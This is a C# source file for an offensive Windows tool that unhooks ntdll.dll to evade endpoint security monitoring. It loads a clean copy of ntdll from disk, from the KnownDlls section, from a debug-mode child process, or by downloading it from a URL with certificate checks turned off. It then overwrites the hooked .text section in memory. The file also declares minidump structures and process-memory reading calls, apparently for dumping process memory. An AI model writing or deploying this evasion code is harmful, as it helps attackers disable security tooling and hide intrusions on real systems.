using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;


namespace UnreadablePEB
{
    internal class NT
    {
        //////////////////// FUNCTIONS //////////////////// 
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, uint hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr CreateFileMappingA(IntPtr hFile, uint lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("kernel32.dll", SetLastError = true)] public static extern uint ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out uint lpNumberOfBytesRead);

        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtOpenSection(ref IntPtr FileHandle, int DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint RtlGetVersion(ref OSVERSIONINFOEX lpVersionInformation);

        [DllImport("ntdll.dll")] public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")] public static extern bool DebugActiveProcessStop(int dwProcessId);

        [DllImport("kernel32.dll")] public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")] public static extern bool NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);

        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("psapi.dll", SetLastError = true)] public static extern bool EnumProcessModules(IntPtr hProcess, IntPtr[] lphModule, uint cb, out uint lpcbNeeded);

        [DllImport("psapi.dll", SetLastError = true)] public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpFilename, int nSize);


        public static OBJECT_ATTRIBUTES InitializeObjectAttributes(string dll_name, UInt32 Attributes)
        {
            OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES();
            objectAttributes.RootDirectory = IntPtr.Zero;
            UNICODE_STRING objectName = new UNICODE_STRING();
            objectName.Buffer = dll_name;
            objectName.Length = (ushort)(dll_name.Length * 2);
            objectName.MaximumLength = (ushort)(dll_name.Length * 2 + 2);
            objectAttributes.ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(objectName));
            Marshal.StructureToPtr(objectName, objectAttributes.ObjectName, false);
            objectAttributes.SecurityDescriptor = IntPtr.Zero;
            objectAttributes.SecurityQualityOfService = IntPtr.Zero;
            objectAttributes.Attributes = Attributes;
            objectAttributes.Length = Convert.ToUInt32(Marshal.SizeOf(objectAttributes));
            return objectAttributes;
        }

        ///////////////////// STRUCTS ///////////////////// 
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; [MarshalAs(UnmanagedType.LPWStr)] public string Buffer; }

        [StructLayout(LayoutKind.Sequential)] public struct OBJECT_ATTRIBUTES { public uint Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }

        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [StructLayout(LayoutKind.Sequential)] public struct OSVERSIONINFOEX { public int dwOSVersionInfoSize; public int dwMajorVersion; public int dwMinorVersion; public int dwBuildNumber; public int dwPlatformId; [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)] public string szCSDVersion; public short wServicePackMajor; public short wServicePackMinor; public short wSuiteMask; public byte wProductType; public byte wReserved; }

        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }

        [StructLayout(LayoutKind.Sequential)] public struct CLIENT_ID { public IntPtr UniqueProcess; public IntPtr UniqueThread; }


        ////////////// STRUCTS - Minidump file //////////
        [StructLayout(LayoutKind.Sequential)] public struct Memory64Info { public IntPtr Address; public IntPtr Size; }

        [StructLayout(LayoutKind.Sequential)] public struct MinidumpHeader { public uint Signature; public ushort Version; public ushort ImplementationVersion; public ushort NumberOfStreams; public uint StreamDirectoryRva; public uint CheckSum; public IntPtr TimeDateStamp; }

        [StructLayout(LayoutKind.Sequential)] public struct MinidumpStreamDirectoryEntry { public uint StreamType; public uint Size; public uint Location; }

        [StructLayout(LayoutKind.Sequential)] public struct SystemInfoStream { public ushort ProcessorArchitecture; public ushort ProcessorLevel; public ushort ProcessorRevision; public byte NumberOfProcessors; public byte ProductType; public uint MajorVersion; public uint MinorVersion; public uint BuildNumber; public uint PlatformId; public uint UnknownField1; public uint UnknownField2; public IntPtr ProcessorFeatures; public IntPtr ProcessorFeatures2; public uint UnknownField3; public ushort UnknownField14; public byte UnknownField15; }

        [StructLayout(LayoutKind.Sequential, Pack = 2)] public struct ModuleListStream { public uint NumberOfModules; }

        [StructLayout(LayoutKind.Sequential, Pack = 2)] public struct ModuleInfoStruct { public IntPtr BaseAddress; public uint Size; public uint UnknownField1; public uint Timestamp; public uint PointerName; public IntPtr UnknownField2; public IntPtr UnknownField3; public IntPtr UnknownField4; public IntPtr UnknownField5; public IntPtr UnknownField6; public IntPtr UnknownField7; public IntPtr UnknownField8; public IntPtr UnknownField9; public IntPtr UnknownField10; public IntPtr UnknownField11; }

        [StructLayout(LayoutKind.Sequential)] public struct Memory64ListStream { public ulong NumberOfEntries; public uint MemoryRegionsBaseAddress; }

        //////////////////// CONSTANTS ////////////////////
        public const uint GENERIC_READ = (uint)0x80000000; // https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/262970b7-cd4a-41f4-8c4d-5a27f0092aaa
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint OPEN_EXISTING = 3; // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
        public const uint FILE_ATTRIBUTE_NORMAL = (uint)0x00000080; // https://learn.microsoft.com/es-es/windows/win32/fileio/file-attribute-constants
        public const uint PAGE_READONLY = 0x02; // https://learn.microsoft.com/es-es/windows/win32/memory/memory-protection-constants
        public const uint SEC_IMAGE_NO_EXECUTE = 0x11000000; // https://learn.microsoft.com/es-es/windows/win32/api/winbase/nf-winbase-createfilemappinga
        public const uint FILE_MAP_READ = 4; // https://www.codeproject.com/Tips/79069/How-to-use-a-memory-mapped-file-with-Csharp-in-Win
        public const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const int SECTION_MAP_READ = 0x0004; // https://www.codeproject.com/Tips/79069/How-to-use-a-memory-mapped-file-with-Csharp-in-Win
        public const uint DEBUG_PROCESS = 0x00000001;
        public const int offset_mappeddll = 4096;
        public const int offset_fromdiskdll = 0x400;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint MemoryBasicInformation = 0;
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;
        public const int MAX_PATH = 260;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;


        // Custom Classes
        public class ModuleInformation
        {
            public string Name;
            public string FullPath;
            public IntPtr Address;
            public int Size;
            public ModuleInformation(string name, string fullpath, IntPtr address, int size)
            {
                this.Name = name;
                this.FullPath = fullpath;
                this.Address = address;
                this.Size = size;
            }
        }


        public class MemFile
        {
            public string filename;
            public byte[] content;
            public MemFile(string filename, byte[] content)
            {
                this.filename = filename;
                this.content = content;
            }
        }



        // Map ntdl.dll from the file in disk and return view address
        public static IntPtr MapNtdllFromDisk(string ntdll_path)
        {
            IntPtr hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

            // CreateFileA
            if (hFile == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling CreateFileA");
                Environment.Exit(0);
            }

            // 	CreateFileMappingA
            IntPtr hSection = CreateFileMappingA(hFile, 0, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, "");
            if (hSection == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling CreateFileMappingA");
                Environment.Exit(0);
            }

            // 	MapViewOfFile
            IntPtr pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
            if (pNtdllBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling MapViewOfFile");
                Environment.Exit(0);
            }

            // CloseHandle
            bool createfile_ch = CloseHandle(hFile);
            bool createfilemapping_ch = CloseHandle(hSection);
            if (!createfile_ch || !createfilemapping_ch)
            {
                Console.WriteLine("[-] Error calling CloseHandle");
                Environment.Exit(0);
            }
            return pNtdllBuffer;
        }


        // Map ntdl.dll from the file in KnownDlls folder and return view address
        public static IntPtr MapNtdllFromKnownDlls()
        {
            // Initialize OBJECT_ATTRIBUTES struct
            string dll_name = "\\KnownDlls\\ntdll.dll";

            // If 32-bit process the path changes
            if (IntPtr.Size == 4)
            {
                dll_name = "\\KnownDlls32\\ntdll.dll";
            }
            OBJECT_ATTRIBUTES object_attribute = InitializeObjectAttributes(dll_name, OBJ_CASE_INSENSITIVE);

            // NtOpenSection
            IntPtr hSection = IntPtr.Zero;
            uint NtStatus = NtOpenSection(ref hSection, SECTION_MAP_READ, ref object_attribute);
            if (NtStatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenSection. NTSTATUS: " + NtStatus.ToString("X"));
                Environment.Exit(0);
            }

            // 	MapViewOfFile
            IntPtr pNtdllBuffer = MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
            if (pNtdllBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling MapViewOfFile");
                Environment.Exit(0);
            }

            // CloseHandle
            bool createfilemapping_ch = CloseHandle(hSection);
            if (!createfilemapping_ch)
            {
                Console.WriteLine("[-] Error calling CloseHandle");
                Environment.Exit(0);
            }

            return pNtdllBuffer;
        }


        public static int[] GetTextSectionInfo(IntPtr ntdl_address)
        {
            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;

            // Check MZ Signature
            byte[] data = new byte[2];
            IntPtr signature_addr = ntdl_address;
            ReadProcessMemory(hProcess, signature_addr, data, data.Length, out _);
            string signature_dos_header = System.Text.Encoding.Default.GetString(data);
            if (signature_dos_header != "MZ")
            {
                Console.WriteLine("[-] Incorrect DOS header signature");
                Environment.Exit(0);
            }

            // e_lfanew in offset 0x3C in _IMAGE_DOS_HEADER structure, its size is 4 bytes 
            data = new byte[4];
            IntPtr e_lfanew_addr = ntdl_address + 0x3C;
            ReadProcessMemory(hProcess, e_lfanew_addr, data, 4, out _);
            int e_lfanew = BitConverter.ToInt32(data, 0);

            // Check PE Signature
            IntPtr image_nt_headers_addr = ntdl_address + e_lfanew;
            data = new byte[2];
            ReadProcessMemory(hProcess, image_nt_headers_addr, data, data.Length, out _);
            string signature_nt_header = System.Text.Encoding.Default.GetString(data);
            if (signature_nt_header != "PE")
            {
                Console.WriteLine("[-] Incorrect NT header signature");
                Environment.Exit(0);
            }

            // Check Optional Headers Magic field value
            IntPtr optional_headers_addr = image_nt_headers_addr + 24; // Marshal.SizeOf(typeof(UInt32)) + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) = 24
            data = new byte[4];
            ReadProcessMemory(hProcess, optional_headers_addr, data, data.Length, out _);
            int optional_header_magic = BitConverter.ToInt16(data, 0);
            if (optional_header_magic != 0x20B && optional_header_magic != 0x10B)
            {
                Console.WriteLine("[-] Incorrect Optional Header Magic field value");
                Environment.Exit(0);
            }

            // SizeOfCode
            IntPtr sizeofcode_addr = optional_headers_addr + 4; // Uint16 (2 bytes) + Byte (1 byte) + Byte (1 byte) 
            data = new byte[4];
            ReadProcessMemory(hProcess, sizeofcode_addr, data, data.Length, out _);
            int sizeofcode = BitConverter.ToInt32(data, 0);

            // BaseOfCode
            IntPtr baseofcode_addr = optional_headers_addr + 20; // Uint16 (2 bytes) + 2 Byte (1 byte) + 4 Uint32 (4 byte) - public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode;
            data = new byte[4];
            ReadProcessMemory(hProcess, baseofcode_addr, data, data.Length, out _);
            int baseofcode = BitConverter.ToInt32(data, 0);

            int[] result = { baseofcode, sizeofcode };
            return result;
        }


        // Create debug process, map its ntdl.dll .text section and copy it to a new buffer, return the buffer address
        public unsafe static IntPtr GetNtdllFromDebugProc(string process_path)
        {
            // CreateProcess in DEBUG mode
            STARTUPINFO si = new STARTUPINFO();
            si.cb = System.Runtime.InteropServices.Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool createprocess_res = CreateProcess(process_path, null, IntPtr.Zero, IntPtr.Zero, false, DEBUG_PROCESS, IntPtr.Zero, null, ref si, out pi);
            if (!createprocess_res)
            {
                Console.WriteLine("[-] Error calling CreateProcess");
                Environment.Exit(0);
            }

            // Ntdll .Text Section Address and Size from local process
            IntPtr localNtdllHandle = GetLocalNtdll(); // CustomGetModuleHandle("ntdll.dll");
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;

            // ReadProcessMemory to copy the bytes from ntdll.dll in the suspended process into a new buffer (ntdllBuffer)
            // debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
            byte[] ntdllBuffer = new byte[localNtdllTxtSize];
            uint readprocmem_res = ReadProcessMemory(pi.hProcess, localNtdllTxt, ntdllBuffer, ntdllBuffer.Length, out _);
            if (readprocmem_res == 0)
            {
                Console.WriteLine("[-] Error calling ReadProcessMemory");
                Environment.Exit(0);
            }

            // Get pointer to the buffer containing ntdll.dll
            IntPtr pNtdllBuffer = IntPtr.Zero;
            fixed (byte* p = ntdllBuffer)
            {
                pNtdllBuffer = (IntPtr)p;
            }

            // Terminate and close handles in debug process
            bool debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
            bool terminateproc_res = TerminateProcess(pi.hProcess, 0);
            if (debugstop_res == false || terminateproc_res == false)
            {
                Console.WriteLine("[-] Error calling DebugActiveProcessStop or TerminateProcess");
                Environment.Exit(0);
            }
            bool closehandle_proc = CloseHandle(pi.hProcess);
            bool closehandle_thread = CloseHandle(pi.hThread);
            if (!closehandle_proc || !closehandle_thread)
            {
                Console.WriteLine("[-] Error calling CloseHandle");
                Environment.Exit(0);
            }

            return pNtdllBuffer;
        }


        // Overwrite hooked ntdll .text section with a clean version
        static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
            uint dwOldProtection;
            bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            if (!vp1_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)");
                Environment.Exit(0);
            }

            // Copy from one address to the other
            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }

            // VirtualProtect back to PAGE_EXECUTE_READ
            bool vp2_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, dwOldProtection, out dwOldProtection);
            if (!vp2_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (dwOldProtection)");
                Environment.Exit(0);
            }
        }


        public unsafe static IntPtr GetNtdllFromFromUrl(string dll_url)
        {
            Console.WriteLine("[+] Getting payload from url: " + dll_url);
            System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
            byte[] buf;
            using (System.Net.WebClient myWebClient = new System.Net.WebClient())
            {
                try
                {
                    System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    buf = myWebClient.DownloadData(dll_url);
                    fixed (byte* p = buf)
                    {
                        IntPtr ptr = (IntPtr)p;
                        return ptr;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    Environment.Exit(0);
                }
            }
            return IntPtr.Zero;
        }


        public static IntPtr GetLocalNtdll()
        {
            IntPtr moduleHandle = IntPtr.Zero;
            using (Process process = Process.GetCurrentProcess())
            {
                IntPtr processHandle = process.Handle;

                // Allocate buffer for module handles
                IntPtr[] moduleHandles = new IntPtr[1024];
                uint bytesNeeded;

                // Enumerate process modules
                if (EnumProcessModules(processHandle, moduleHandles, (uint)(IntPtr.Size * moduleHandles.Length), out bytesNeeded))
                {
                    int moduleCount = (int)(bytesNeeded / IntPtr.Size);

                    // Iterate through modules to find ntdll.dll
                    for (int i = 0; i < moduleCount; i++)
                    {
                        moduleHandle = moduleHandles[i];
                        StringBuilder modulePath = new StringBuilder(MAX_PATH);

                        // Get the module file name
                        if (GetModuleFileNameEx(processHandle, moduleHandle, modulePath, modulePath.Capacity) > 0)
                        {
                            string path = modulePath.ToString();
                            string fileName = System.IO.Path.GetFileName(path);

                            // Check if the file name is ntdll.dll
                            if (fileName.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                            {
                                return moduleHandle;
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Failed to enumerate process modules.");
                }
            }
            return moduleHandle;
        }


        public static void ReplaceLibrary(string option, string wildcard_field)
        {
            // Clean DLL
            IntPtr unhookedNtdllTxt = IntPtr.Zero;
            switch (option)
            {
                // From file in disk
                case "disk":
                    if (wildcard_field == "")
                    {
                        wildcard_field = "C:\\Windows\\System32\\ntdll.dll";
                    }
                    IntPtr unhookedNtdllHandle = MapNtdllFromDisk(wildcard_field);
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    break;

                // From KnownDlls folder
                case "knowndlls":
                    unhookedNtdllHandle = MapNtdllFromKnownDlls();
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
                    break;

                // From a process created in DEBUG mode
                case "debugproc":
                    if (wildcard_field == "")
                    {
                        wildcard_field = "c:\\windows\\system32\\calc.exe";
                    }
                    unhookedNtdllTxt = GetNtdllFromDebugProc(wildcard_field);
                    break;

                // From a process created in DEBUG mode
                case "download":
                    if (wildcard_field == "")
                    {
                        wildcard_field = "http://127.0.0.1/ntdll.dll";
                    }
                    unhookedNtdllHandle = GetNtdllFromFromUrl(wildcard_field);
                    unhookedNtdllTxt = unhookedNtdllHandle + offset_fromdiskdll;
                    break;

                // Default: Show usage message
                default:
                    return;
            }

            // Local DLL
            IntPtr localNtdllHandle = GetLocalNtdll(); // CustomGetModuleHandle("ntdll.dll");
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;

            // Replace DLL
            Console.WriteLine("[+] Copying " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);
        }
    }
}